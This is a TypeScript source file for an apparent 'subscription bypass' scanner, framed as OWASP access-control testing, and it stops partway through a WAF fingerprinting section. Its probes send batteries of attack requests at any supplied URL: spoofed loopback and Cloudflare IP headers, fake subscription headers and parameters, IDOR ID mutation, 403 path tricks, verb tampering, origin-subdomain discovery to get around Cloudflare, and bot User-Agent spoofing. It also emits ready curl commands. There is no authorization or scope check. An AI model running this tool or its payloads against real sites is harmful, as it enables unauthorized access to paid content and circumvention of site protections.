import { createSubsystemLogger } from "../logging/subsystem.js";

const log = createSubsystemLogger("tools/subscription_bypass");

export interface SubscriptionBypassResult {
    status: "success" | "error";
    target_url: string;
    findings: SubscriptionBypassFinding[];
    poc_report: PoCReport | null;
    message: string;
}

export interface SubscriptionBypassFinding {
    id: string;
    probe_type: string;
    severity: "critical" | "high" | "medium" | "low" | "info";
    title: string;
    description: string;
    bypass_method: string;
    evidence: string;
    cvss_score: number;
    reproduction_steps: string[];
}

export interface PoCReport {
    target: string;
    vulnerability_class: string;
    owasp_category: string;
    total_findings: number;
    critical_count: number;
    high_count: number;
    findings: SubscriptionBypassFinding[];
    generated_at: string;
}

interface ProbeContext {
    url: string;
    auth_token?: string;
    cookies?: string;
    onProgress?: (stage: string, detail: string) => void;
}

/**
 * Subscription Bypass Scanner — OWASP A01:2021 (Broken Access Control)
 * 
 * Analyzes paywall-protected URLs for subscription bypass vulnerabilities.
 * Runs 6 probe types and generates a structured PoC report.
 */
export async function scanSubscriptionBypass(context: ProbeContext): Promise<SubscriptionBypassResult> {
    const { url, auth_token, cookies, onProgress } = context;
    const findings: SubscriptionBypassFinding[] = [];
    let findingCounter = 0;

    const emit = (stage: string, detail: string) => {
        log.info(`[${stage}] ${detail}`);
        onProgress?.(stage, detail);
    };

    emit("INIT", `Subscription Bypass scan initiated for: ${url}`);

    const parsedUrl = new URL(url);
    const baseUrl = `${parsedUrl.protocol}//${parsedUrl.host}`;

    // Build headers for authenticated requests
    const authedHeaders: Record<string, string> = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    };
    if (auth_token) {
        authedHeaders["Authorization"] = auth_token.startsWith("Bearer ") ? auth_token : `Bearer ${auth_token}`;
    }
    if (cookies) {
        authedHeaders["Cookie"] = cookies;
    }

    const unauthHeaders: Record<string, string> = {
        "User-Agent": authedHeaders["User-Agent"],
        "Accept": authedHeaders["Accept"],
        "Accept-Language": authedHeaders["Accept-Language"],
    };

    // ═══════════════════════════════════════════════
    // PROBE 1: Direct URL Access (No Auth)
    // ═══════════════════════════════════════════════
    emit("PROBE_1", "Direct URL Enumeration — Testing access without authentication...");

    try {
        // First, get the authenticated response for baseline comparison
        const authedResponse = await fetchWithTimeout(url, { headers: authedHeaders });
        const authedBody = await authedResponse.text();
        const authedLength = authedBody.length;

        // Now try without auth
        const unauthResponse = await fetchWithTimeout(url, { headers: unauthHeaders });
        const unauthBody = await unauthResponse.text();

        if (unauthResponse.status === 200) {
            const similarity = calculateSimilarity(authedBody, unauthBody);

            if (similarity > 0.85) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Direct Access",
                    severity: "critical",
                    title: "Paywall Content Accessible Without Authentication",
                    description: `The protected resource at ${url} returns substantially identical content (${(similarity * 100).toFixed(1)}% match) when accessed without any authentication credentials.`,
                    bypass_method: "Remove all authentication headers/cookies and access the URL directly.",
                    evidence: `Authenticated response: ${authedLength} bytes. Unauthenticated response: ${unauthBody.length} bytes. Similarity: ${(similarity * 100).toFixed(1)}%`,
                    cvss_score: 8.6,
                    reproduction_steps: [
                        `Open a private/incognito browser window`,
                        `Navigate to: ${url}`,
                        `Observe that the full paid content is accessible without login`,
                    ]
                });
                emit("PROBE_1", `CRITICAL: Content accessible without auth (${(similarity * 100).toFixed(1)}% match)`);
            } else if (similarity > 0.5) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Direct Access",
                    severity: "medium",
                    title: "Partial Content Leak Without Authentication",
                    description: `The resource returns partial paid content (${(similarity * 100).toFixed(1)}% match) without authentication. The paywall may only hide UI elements.`,
                    bypass_method: "Access URL without auth — partial content is returned in the HTML source.",
                    evidence: `Similarity score: ${(similarity * 100).toFixed(1)}%`,
                    cvss_score: 5.3,
                    reproduction_steps: [
                        `Open the URL in incognito mode: ${url}`,
                        `View Page Source (Ctrl+U) and search for protected content`,
                    ]
                });
                emit("PROBE_1", `MEDIUM: Partial content leak detected (${(similarity * 100).toFixed(1)}% match)`);
            } else {
                emit("PROBE_1", "Direct access blocked — paywall enforced server-side.");
            }
        } else {
            emit("PROBE_1", `Direct access returned ${unauthResponse.status} — access properly restricted.`);
        }

        // Test URL path stripping (remove trailing segments, try /download, /raw, /view)
        const pathVariants = generatePathVariants(parsedUrl);
        for (const variant of pathVariants) {
            try {
                const variantResp = await fetchWithTimeout(variant, {
                    headers: unauthHeaders,
                    redirect: "manual",
                });
                if (variantResp.status === 200) {
                    const variantBody = await variantResp.text();
                    const sim = calculateSimilarity(authedBody, variantBody);
                    if (sim > 0.5) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "URL Path Manipulation",
                            severity: "high",
                            title: "Content Accessible Via Alternative URL Path",
                            description: `Alternative URL path ${variant} returns paid content (${(sim * 100).toFixed(1)}% match) without requiring subscription.`,
                            bypass_method: `Access content via modified URL: ${variant}`,
                            evidence: `Status: ${variantResp.status}, Similarity: ${(sim * 100).toFixed(1)}%`,
                            cvss_score: 7.5,
                            reproduction_steps: [
                                `Navigate to: ${variant}`,
                                `Observe that the paid content is accessible`,
                            ]
                        });
                        emit("PROBE_1", `HIGH: Alternative path bypass found: ${variant}`);
                    }
                }
            } catch { /* continue to next variant */ }
        }
    } catch (err) {
        emit("PROBE_1", `Probe failed: ${err}`);
    }

    // ═══════════════════════════════════════════════
    // PROBE 2: Auth Header Bypass
    // ═══════════════════════════════════════════════
    emit("PROBE_2", "Auth Header Bypass — Testing role escalation via header injection...");

    const bypassHeaders: Array<{ name: string; value: string; label: string }> = [
        { name: "X-Subscription-Tier", value: "premium", label: "Subscription Tier Header" },
        { name: "X-User-Role", value: "premium", label: "User Role Header" },
        { name: "X-Is-Subscribed", value: "true", label: "Subscription Flag Header" },
        { name: "X-Account-Type", value: "paid", label: "Account Type Header" },
        { name: "X-Forwarded-For", value: "127.0.0.1", label: "Internal IP Spoof" },
        { name: "X-Original-URL", value: "/admin", label: "URL Override Header" },
        { name: "X-Rewrite-URL", value: parsedUrl.pathname, label: "Rewrite URL Header" },
        { name: "X-Custom-IP-Authorization", value: "127.0.0.1", label: "IP Auth Header" },
    ];

    for (const header of bypassHeaders) {
        try {
            const testHeaders = {
                ...unauthHeaders,
                [header.name]: header.value,
            };
            const resp = await fetchWithTimeout(url, { headers: testHeaders });

            if (resp.status === 200) {
                const body = await resp.text();
                // Check if we got more content than the unauthenticated baseline
                if (body.length > 1000 && containsPaidIndicators(body)) {
                    findings.push({
                        id: `SB-${++findingCounter}`,
                        probe_type: "Header Injection",
                        severity: "critical",
                        title: `Subscription Bypass via ${header.label}`,
                        description: `Injecting header '${header.name}: ${header.value}' grants access to paid content without valid subscription.`,
                        bypass_method: `Add header: ${header.name}: ${header.value}`,
                        evidence: `Response with injected header: ${body.length} bytes, contains paid content indicators`,
                        cvss_score: 9.1,
                        reproduction_steps: [
                            `Use curl or Burp Suite to send a request to: ${url}`,
                            `Add header: ${header.name}: ${header.value}`,
                            `Observe that the premium content is returned without authentication`,
                            `cURL: curl -H "${header.name}: ${header.value}" "${url}"`,
                        ]
                    });
                    emit("PROBE_2", `CRITICAL: Bypass confirmed via ${header.label}`);
                }
            }
        } catch { /* continue */ }
    }

    emit("PROBE_2", `Header bypass probes complete. Tested ${bypassHeaders.length} vectors.`);

    // ═══════════════════════════════════════════════
    // PROBE 3: Parameter Tampering
    // ═══════════════════════════════════════════════
    emit("PROBE_3", "Parameter Tampering — Testing subscription state manipulation...");

    const paramPayloads: Array<{ params: Record<string, string>; label: string }> = [
        { params: { paid: "true" }, label: "paid=true" },
        { params: { subscribed: "1" }, label: "subscribed=1" },
        { params: { tier: "premium" }, label: "tier=premium" },
        { params: { access: "full" }, label: "access=full" },
        { params: { preview: "false" }, label: "preview=false (disable preview mode)" },
        { params: { paywall: "false" }, label: "paywall=false" },
        { params: { bypass: "1" }, label: "bypass=1" },
        { params: { debug: "1" }, label: "debug=1 (debug mode)" },
    ];

    for (const payload of paramPayloads) {
        try {
            const testUrl = new URL(url);
            for (const [key, val] of Object.entries(payload.params)) {
                testUrl.searchParams.set(key, val);
            }

            const resp = await fetchWithTimeout(testUrl.toString(), { headers: unauthHeaders });
            if (resp.status === 200) {
                const body = await resp.text();
                if (containsPaidIndicators(body)) {
                    findings.push({
                        id: `SB-${++findingCounter}`,
                        probe_type: "Parameter Tampering",
                        severity: "high",
                        title: `Subscription Bypass via Parameter: ${payload.label}`,
                        description: `Adding query parameter '${payload.label}' grants access to paid content.`,
                        bypass_method: `Append parameter to URL: ?${Object.entries(payload.params).map(([k, v]) => `${k}=${v}`).join('&')}`,
                        evidence: `Response: ${body.length} bytes with paid content indicators`,
                        cvss_score: 7.5,
                        reproduction_steps: [
                            `Navigate to: ${testUrl.toString()}`,
                            `Observe that the premium content is accessible`,
                        ]
                    });
                    emit("PROBE_3", `HIGH: Parameter bypass found: ${payload.label}`);
                }
            }
        } catch { /* continue */ }
    }

    // IDOR on content IDs
    const contentId = extractContentId(parsedUrl);
    if (contentId) {
        emit("PROBE_3", `Content ID detected: ${contentId}. Testing IDOR...`);
        const idorVariants = generateIdorVariants(contentId, parsedUrl);
        for (const variant of idorVariants) {
            try {
                const resp = await fetchWithTimeout(variant.url, { headers: unauthHeaders });
                if (resp.status === 200) {
                    const body = await resp.text();
                    if (body.length > 500) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "IDOR",
                            severity: "high",
                            title: `IDOR — Accessing Other Users' Paid Content via ID Manipulation`,
                            description: `Modifying content ID from '${contentId}' to '${variant.mutatedId}' returns different paid content accessible without subscription.`,
                            bypass_method: `Replace content ID in URL: ${variant.url}`,
                            evidence: `Response for mutated ID: ${body.length} bytes`,
                            cvss_score: 7.5,
                            reproduction_steps: [
                                `Original URL: ${url}`,
                                `Modified URL: ${variant.url}`,
                                `Observe access to another user's paid content`,
                            ]
                        });
                        emit("PROBE_3", `HIGH: IDOR confirmed with mutated ID: ${variant.mutatedId}`);
                    }
                }
            } catch { /* continue */ }
        }
    }

    emit("PROBE_3", "Parameter tampering probes complete.");

    // ═══════════════════════════════════════════════
    // PROBE 4: Response/Source Analysis
    // ═══════════════════════════════════════════════
    emit("PROBE_4", "Response Analysis — Checking for client-side paywall gates...");

    try {
        const resp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const body = await resp.text();

        // Check for hidden content in source  
        const hiddenContentPatterns = [
            { pattern: /display:\s*none[^>]*>[\s\S]{200,}/i, label: "CSS Hidden Content (display:none)" },
            { pattern: /visibility:\s*hidden[^>]*>[\s\S]{200,}/i, label: "CSS Hidden Content (visibility:hidden)" },
            { pattern: /class="[^"]*(?:paywall|premium|gated|locked|blurred)[^"]*"[^>]*>[\s\S]{100,}/i, label: "Paywall CSS Class with Embedded Content" },
            { pattern: /data-content="[^"]{100,}"/i, label: "Content in data attributes" },
            { pattern: /<script[^>]*>[\s\S]*?(?:fullContent|paidContent|premiumText|articleBody)[\s\S]*?"[^"]{200,}"/i, label: "Content embedded in JavaScript" },
        ];

        for (const { pattern, label } of hiddenContentPatterns) {
            if (pattern.test(body)) {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "Client-Side Gate",
                    severity: "high",
                    title: `Client-Side Paywall — ${label}`,
                    description: `Full paid content is present in the page source but hidden by client-side CSS/JS. This is a client-side-only paywall that provides no server-side protection.`,
                    bypass_method: `View Page Source, or use browser DevTools to remove the '${label.toLowerCase()}' style/class.`,
                    evidence: `Pattern matched: ${label}`,
                    cvss_score: 7.5,
                    reproduction_steps: [
                        `Navigate to: ${url}`,
                        `Open browser DevTools (F12)`,
                        `Search for hidden content in Elements tab`,
                        `Remove the CSS rule or class hiding the content`,
                        `OR: View Page Source (Ctrl+U) and extract the content from the HTML`,
                    ]
                });
                emit("PROBE_4", `HIGH: Client-side paywall detected — ${label}`);
            }
        }

        // Check for API endpoints that might return raw content
        const apiEndpoints = extractApiEndpoints(body);
        if (apiEndpoints.length > 0) {
            emit("PROBE_4", `Found ${apiEndpoints.length} API endpoints in page source. Testing direct access...`);
            for (const endpoint of apiEndpoints.slice(0, 10)) {
                try {
                    const apiUrl = endpoint.startsWith("http") ? endpoint : `${baseUrl}${endpoint}`;
                    const apiResp = await fetchWithTimeout(apiUrl, { headers: unauthHeaders });
                    if (apiResp.status === 200) {
                        const apiBody = await apiResp.text();
                        if (apiBody.length > 200 && (looksLikeJson(apiBody) || apiBody.includes("content"))) {
                            findings.push({
                                id: `SB-${++findingCounter}`,
                                probe_type: "API Endpoint Leak",
                                severity: "high",
                                title: `Direct API Access Bypasses Subscription Check`,
                                description: `The API endpoint ${apiUrl} returns content data without requiring subscription authentication.`,
                                bypass_method: `Call API directly: ${apiUrl}`,
                                evidence: `Response: ${apiBody.length} bytes, appears to be content data`,
                                cvss_score: 7.5,
                                reproduction_steps: [
                                    `Send GET request to: ${apiUrl}`,
                                    `Observe that paid content data is returned without auth`,
                                ]
                            });
                            emit("PROBE_4", `HIGH: API endpoint leaks content — ${apiUrl}`);
                        }
                    }
                } catch { /* continue */ }
            }
        }
    } catch (err) {
        emit("PROBE_4", `Response analysis failed: ${err}`);
    }

    // ═══════════════════════════════════════════════
    // PROBE 5: Cache Poisoning / CDN Bypass
    // ═══════════════════════════════════════════════
    emit("PROBE_5", "Cache Poisoning — Testing CDN/cache behavior...");

    try {
        // Request with cache-busting to check if CDN serves stale paid content
        const cacheBusters = [
            { header: "Cache-Control", value: "no-cache, no-store" },
            { header: "Pragma", value: "no-cache" },
            { header: "X-Forwarded-Host", value: parsedUrl.host },
        ];

        const cacheTestUrl = new URL(url);
        cacheTestUrl.searchParams.set("_cb", Date.now().toString());

        const resp1 = await fetchWithTimeout(cacheTestUrl.toString(), { headers: unauthHeaders });
        const cacheHeaders = Object.fromEntries(resp1.headers.entries());

        if (cacheHeaders["x-cache"] || cacheHeaders["cf-cache-status"] || cacheHeaders["x-cdn"]) {
            const cdnProvider = cacheHeaders["server"] || cacheHeaders["x-cdn"] || "Unknown CDN";

            // Check if different cache keys return paid content
            for (const buster of cacheBusters) {
                const testHeaders = { ...unauthHeaders, [buster.header]: buster.value };
                const resp = await fetchWithTimeout(url, { headers: testHeaders });
                if (resp.status === 200) {
                    const body = await resp.text();
                    if (containsPaidIndicators(body)) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "Cache Bypass",
                            severity: "high",
                            title: `CDN Cache Serves Paid Content (${cdnProvider})`,
                            description: `The CDN caches authenticated content and serves it to unauthenticated users, bypassing the subscription check.`,
                            bypass_method: `Request with header '${buster.header}: ${buster.value}' to force cache hit.`,
                            evidence: `CDN: ${cdnProvider}, Cache status: ${cacheHeaders["x-cache"] || cacheHeaders["cf-cache-status"]}`,
                            cvss_score: 8.1,
                            reproduction_steps: [
                                `curl -H "${buster.header}: ${buster.value}" "${url}"`,
                                `Check X-Cache or CF-Cache-Status header in response`,
                            ]
                        });
                        emit("PROBE_5", `HIGH: CDN cache bypass detected (${cdnProvider})`);
                        break;
                    }
                }
            }
        } else {
            emit("PROBE_5", "No CDN/cache layer detected. Skipping cache probes.");
        }
    } catch (err) {
        emit("PROBE_5", `Cache probe failed: ${err}`);
    }

    // ═══════════════════════════════════════════════
    // PROBE 6: HTTP Method Override & Verb Tampering
    // ═══════════════════════════════════════════════
    emit("PROBE_6", "Method Override — Testing verb tampering and method override headers...");

    const methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"];
    const overrideHeaders = [
        { name: "X-HTTP-Method-Override", value: "GET" },
        { name: "X-Method-Override", value: "GET" },
        { name: "X-HTTP-Method", value: "GET" },
    ];

    for (const override of overrideHeaders) {
        try {
            const resp = await fetchWithTimeout(url, {
                method: "POST",
                headers: { ...unauthHeaders, [override.name]: override.value },
            });
            if (resp.status === 200) {
                const body = await resp.text();
                if (containsPaidIndicators(body)) {
                    findings.push({
                        id: `SB-${++findingCounter}`,
                        probe_type: "Method Override",
                        severity: "medium",
                        title: `HTTP Method Override Bypasses Access Control (${override.name})`,
                        description: `Sending POST with '${override.name}: GET' bypasses the subscription middleware and returns paid content.`,
                        bypass_method: `POST request with header: ${override.name}: ${override.value}`,
                        evidence: `Response: ${body.length} bytes with paid indicators`,
                        cvss_score: 5.3,
                        reproduction_steps: [
                            `curl -X POST -H "${override.name}: ${override.value}" "${url}"`,
                        ]
                    });
                    emit("PROBE_6", `MEDIUM: Method override bypass via ${override.name}`);
                }
            }
        } catch { /* continue */ }
    }

    emit("PROBE_6", "Method override probes complete.");

    // ═══════════════════════════════════════════════
    // PROBE 7: 403 Forbidden Bypass (403 → 200)
    // ═══════════════════════════════════════════════
    emit("PROBE_7", "403 Forbidden Bypass — Testing 30+ path/header techniques to turn 403 → 200...");

    // First, check if the target returns 403
    let baseline403 = false;
    try {
        const baseResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        baseline403 = baseResp.status === 403;
        if (baseline403) {
            emit("PROBE_7", `Target returns 403 Forbidden. Initiating bypass matrix...`);
        } else {
            emit("PROBE_7", `Target returns ${baseResp.status}. Testing 403 bypass techniques against paywall paths...`);
        }
    } catch { /* continue anyway */ }

    // 7a. Path traversal / URL manipulation techniques
    const pathBypassVariants = generate403PathBypasses(parsedUrl);
    for (const variant of pathBypassVariants) {
        try {
            const resp = await fetchWithTimeout(variant.url, {
                headers: unauthHeaders,
                redirect: "manual",
            });
            if (resp.status === 200) {
                const body = await resp.text();
                if (body.length > 200) {
                    findings.push({
                        id: `SB-${++findingCounter}`,
                        probe_type: "403 Bypass",
                        severity: "critical",
                        title: `403 Forbidden Bypassed via ${variant.technique}`,
                        description: `The server returned 403 for the original URL but returns 200 OK when the path is modified using '${variant.technique}'. This bypasses the access control enforcement.`,
                        bypass_method: variant.technique,
                        evidence: `Original: 403 Forbidden → Bypass URL returns 200 OK (${body.length} bytes)`,
                        cvss_score: 9.1,
                        reproduction_steps: [
                            `Original URL (403): ${url}`,
                            `Bypass URL (200): ${variant.url}`,
                            `Technique: ${variant.technique}`,
                            `cURL: curl -v "${variant.url}"`,
                        ]
                    });
                    emit("PROBE_7", `CRITICAL: 403 bypassed via ${variant.technique} → ${variant.url}`);
                }
            }
        } catch { /* continue */ }
    }

    // 7b. Header-based 403 bypass
    const forbidden403Headers: Array<{ headers: Record<string, string>; label: string }> = [
        { headers: { "X-Originating-IP": "127.0.0.1" }, label: "X-Originating-IP: 127.0.0.1" },
        { headers: { "X-Forwarded-For": "127.0.0.1" }, label: "X-Forwarded-For: 127.0.0.1" },
        { headers: { "X-Forwarded-For": "127.0.0.1, 127.0.0.2" }, label: "X-Forwarded-For chain" },
        { headers: { "X-Remote-IP": "127.0.0.1" }, label: "X-Remote-IP: 127.0.0.1" },
        { headers: { "X-Remote-Addr": "127.0.0.1" }, label: "X-Remote-Addr: 127.0.0.1" },
        { headers: { "X-Client-IP": "127.0.0.1" }, label: "X-Client-IP: 127.0.0.1" },
        { headers: { "X-Real-IP": "127.0.0.1" }, label: "X-Real-IP: 127.0.0.1" },
        { headers: { "X-Host": "localhost" }, label: "X-Host: localhost" },
        { headers: { "X-Forwarded-Host": "localhost" }, label: "X-Forwarded-Host: localhost" },
        { headers: { "X-ProxyUser-Ip": "127.0.0.1" }, label: "X-ProxyUser-Ip: 127.0.0.1" },
        { headers: { "X-Original-URL": parsedUrl.pathname }, label: "X-Original-URL rewrite" },
        { headers: { "X-Rewrite-URL": parsedUrl.pathname }, label: "X-Rewrite-URL rewrite" },
        { headers: { "X-Custom-IP-Authorization": "127.0.0.1" }, label: "X-Custom-IP-Authorization" },
        { headers: { "X-Forwarded-For": "0000::1" }, label: "X-Forwarded-For: IPv6 loopback" },
        { headers: { "Referer": `${parsedUrl.origin}/admin` }, label: "Referer: /admin" },
        { headers: { "Content-Length": "0" }, label: "Content-Length: 0 (empty body trick)" },
    ];

    for (const probe of forbidden403Headers) {
        try {
            const resp = await fetchWithTimeout(url, {
                headers: { ...unauthHeaders, ...probe.headers },
            });
            if (resp.status === 200 && baseline403) {
                const body = await resp.text();
                if (body.length > 200) {
                    findings.push({
                        id: `SB-${++findingCounter}`,
                        probe_type: "403 Bypass",
                        severity: "critical",
                        title: `403 Bypassed via Header: ${probe.label}`,
                        description: `Injecting '${probe.label}' changes the server response from 403 Forbidden to 200 OK, granting access to protected content.`,
                        bypass_method: `Add header(s): ${Object.entries(probe.headers).map(([k, v]) => `${k}: ${v}`).join(", ")}`,
                        evidence: `403 → 200 with ${body.length} bytes response`,
                        cvss_score: 9.1,
                        reproduction_steps: [
                            `curl -v ${Object.entries(probe.headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")} "${url}"`,
                            `Observe status changes from 403 to 200`,
                        ]
                    });
                    emit("PROBE_7", `CRITICAL: 403 bypassed via ${probe.label}`);
                }
            }
        } catch { /* continue */ }
    }

    // 7c. HTTP verb tampering for 403
    const verbPayloads = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"];
    for (const method of verbPayloads) {
        try {
            const resp = await fetchWithTimeout(url, {
                method,
                headers: unauthHeaders,
            });
            if (resp.status === 200 && baseline403 && method !== "GET") {
                findings.push({
                    id: `SB-${++findingCounter}`,
                    probe_type: "403 Bypass",
                    severity: "high",
                    title: `403 Bypassed via HTTP ${method} Verb`,
                    description: `Changing the HTTP method from GET to ${method} returns 200 OK instead of 403 Forbidden.`,
                    bypass_method: `Use HTTP ${method} instead of GET`,
                    evidence: `GET → 403, ${method} → 200`,
                    cvss_score: 7.5,
                    reproduction_steps: [
                        `curl -X ${method} "${url}"`,
                    ]
                });
                emit("PROBE_7", `HIGH: 403 bypassed via HTTP ${method}`);
            }
        } catch { /* continue */ }
    }

    emit("PROBE_7", "403 Forbidden bypass probes complete.");

    // ═══════════════════════════════════════════════
    // PROBE 8: Cloudflare WAF Bypass
    // ═══════════════════════════════════════════════
    emit("PROBE_8", "Cloudflare WAF Bypass — Detecting CF protection and testing evasion...");

    try {
        const cfResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const cfHeaders = Object.fromEntries(cfResp.headers.entries());
        const isCloudflare = !!(cfHeaders["cf-ray"] || cfHeaders["cf-cache-status"] || cfHeaders["server"]?.toLowerCase().includes("cloudflare"));

        if (isCloudflare) {
            emit("PROBE_8", `Cloudflare detected (CF-Ray: ${cfHeaders["cf-ray"] || "present"}). Testing bypass vectors...`);

            // 8a. Origin IP Discovery via DNS/History
            const originDiscoveryMethods = [
                `${parsedUrl.protocol}//direct.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//origin.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//www.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//mail.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//ftp.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//cpanel.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//webmail.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//staging.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//dev.${parsedUrl.host}${parsedUrl.pathname}`,
                `${parsedUrl.protocol}//api.${parsedUrl.host}${parsedUrl.pathname}`,
            ];

            for (const originUrl of originDiscoveryMethods) {
                try {
                    const resp = await fetchWithTimeout(originUrl, {
                        headers: unauthHeaders,
                        timeout: 5000,
                    });
                    const respHeaders = Object.fromEntries(resp.headers.entries());
                    // If no CF-Ray header, we might have hit the origin directly
                    if (!respHeaders["cf-ray"] && resp.status !== 0 && resp.status < 500) {
                        findings.push({
                            id: `SB-${++findingCounter}`,
                            probe_type: "Cloudflare Bypass",
                            severity: "critical",
                            title: `Cloudflare Origin IP Exposed via Subdomain`,
                            description: `The subdomain ${new URL(originUrl).host} resolves to the origin server directly, bypassing Cloudflare's WAF protection.`,
                            bypass_method: `Access content directly via: ${originUrl}`,
                            evidence: `No CF-Ray header in response. Status: ${resp.status}. This appears to be the unprotected origin.`,
                            cvss_score: 9.1,
                            reproduction_steps: [
                                `Navigate to: ${originUrl}`,
                                `Verify no CF-Ray header (indicates direct origin access)`,
                                `All WAF rules are bypassed at the origin level`,
                            ]
                        });
                        emit("PROBE_8", `CRITICAL: Cloudflare bypassed — origin exposed at ${new URL(originUrl).host}`);
                        break;
                    }
                } catch { /* subdomain doesn't resolve, continue */ }
            }

            // 8b. Cloudflare-specific header manipulation
            const cfBypassHeaders: Array<{ headers: Record<string, string>; label: string }> = [
                {
                    headers: { "CF-Connecting-IP": "127.0.0.1" },
                    label: "CF-Connecting-IP spoof"
                },
                {
                    headers: { "CF-IPCountry": "US", "CF-Visitor": '{"scheme":"https"}', "True-Client-IP": "127.0.0.1" },
                    label: "CF trusted header constellation"
                },
                {
                    headers: { "X-Forwarded-For": "173.245.48.1" },
                    label: "CF IP range spoof (173.245.48.0/20)"
                },
                {
                    headers: { "X-Forwarded-Proto": "https", "X-Forwarded-For": "103.21.244.1" },
                    label: "CF IP range spoof (103.21.244.0/22)"
                },
                {
                    headers: {
                        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                    },
                    label: "Googlebot User-Agent"
                },
                {
                    headers: {
                        "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
                    },
                    label: "Facebook Bot User-Agent"
                },
                {
                    headers: {
                        "User-Agent": "Twitterbot/1.0"
                    },
                    label: "Twitter Bot User-Agent"
                },
            ];

            for (const probe of cfBypassHeaders) {
                try {
                    const resp = await fetchWithTimeout(url, {
                        headers: { ...unauthHeaders, ...probe.headers },
                    });
                    if (resp.status === 200 && (baseline403 || cfResp.status === 403)) {
                        const body = await resp.text();
                        if (body.length > 500) {
                            findings.push({
                                id: `SB-${++findingCounter}`,
                                probe_type: "Cloudflare Bypass",
                                severity: "high",
                                title: `Cloudflare WAF Bypassed via ${probe.label}`,
                                description: `Using '${probe.label}' bypasses Cloudflare's WAF/access rules and returns content that was previously blocked.`,
                                bypass_method: `Headers: ${Object.entries(probe.headers).map(([k, v]) => `${k}: ${v}`).join(", ")}`,
                                evidence: `Previously blocked → now returns ${body.length} bytes`,
                                cvss_score: 8.1,
                                reproduction_steps: [
                                    `curl ${Object.entries(probe.headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")} "${url}"`,
                                    `Observe content accessible despite Cloudflare protection`,
                                ]
                            });
                            emit("PROBE_8", `HIGH: Cloudflare bypassed via ${probe.label}`);
                        }
                    }
                } catch { /* continue */ }
            }

            // 8c. Cloudflare challenge bypass (checking if JS challenge can be skipped)
            if (cfResp.status === 503 || cfResp.status === 403) {
                const cfBody = await cfResp.text();
                const hasChallenge = cfBody.includes("cf-browser-verification") || cfBody.includes("jschl-answer") || cfBody.includes("challenge-platform");
                if (hasChallenge) {
                    emit("PROBE_8", "Cloudflare JS Challenge detected. Testing direct API/non-browser access...");
                    // Try with common Cloudflare clearance cookie format
                    try {
                        const resp = await fetchWithTimeout(url, {
                            headers: {
                                ...unauthHeaders,
                                "Accept": "application/json",
                                "X-Requested-With": "XMLHttpRequest",
                            }
                        });
                        if (resp.status === 200) {
                            findings.push({
                                id: `SB-${++findingCounter}`,
                                probe_type: "Cloudflare Bypass",
                                severity: "high",
                                title: "Cloudflare JS Challenge Bypassed via API Headers",
                                description: "Setting Accept: application/json and X-Requested-With: XMLHttpRequest bypasses the Cloudflare JavaScript challenge.",
                                bypass_method: "Request as AJAX/API call instead of browser navigation",
                                evidence: `Challenge page (503) → 200 OK with API headers`,
                                cvss_score: 7.5,
                                reproduction_steps: [
                                    `curl -H "Accept: application/json" -H "X-Requested-With: XMLHttpRequest" "${url}"`,
                                ]
                            });
                            emit("PROBE_8", "HIGH: Cloudflare JS challenge bypassed via API headers");
                        }
                    } catch { /* continue */ }
                }
            }
        } else {
            emit("PROBE_8", "No Cloudflare protection detected. Skipping CF-specific probes.");
        }
    } catch (err) {
        emit("PROBE_8", `Cloudflare probe failed: ${err}`);
    }

    // ═══════════════════════════════════════════════
    // PROBE 9: Generic WAF Detection & Evasion
    // ═══════════════════════════════════════════════
    emit("PROBE_9", "WAF Detection & Evasion — Fingerprinting WAF and testing bypass payloads...");

    try {
        // 9a. WAF Fingerprinting
        const wafResp = await fetchWithTimeout(url, { headers: unauthHeaders });
        const wafHeaders = Object.fromEntries(wafResp.headers.entries());

        const wafSignatures: Array<{ name: string; check: () => boolean }> = [
            { name: "Cloudflare", check: () => !!wafHeaders["cf-ray"] || wafHeaders["server"]?.includes("cloudflare") },
            { name: "AWS WAF", check: () => !!wafHeaders["x-amzn-requestid"] || wafHeaders["server"]?.includes("awselb") },
            { name: "Akamai", check: () => !!wafHeaders["x-akamai-transformed"] || wafHeaders["server"]?.includes("akamaighost") },
            { name: "Imperva/Incapsula", check: () => !!wafHeaders["x-iinfo"] || !!wafHeaders["x-cdn"] },
            { name: "Sucuri", check: () => wafHeaders["server"]?.includes("sucuri") || !!wafHeaders["x-sucuri-id"] },
            { name: "F5 BIG-IP", check: () => !!wafHeaders["x-wa-info"] || wafHeaders["server"]?.includes("bigip") },
            { name: "ModSecurity", check: () => wafHeaders["server"]?.includes("modsecurity") || (wafResp.status === 403 && !!wafHeaders["server"]?.includes("apache")) },
            { name: "Barracuda", check: () => !!wafHeaders["barra_counter_session"] },
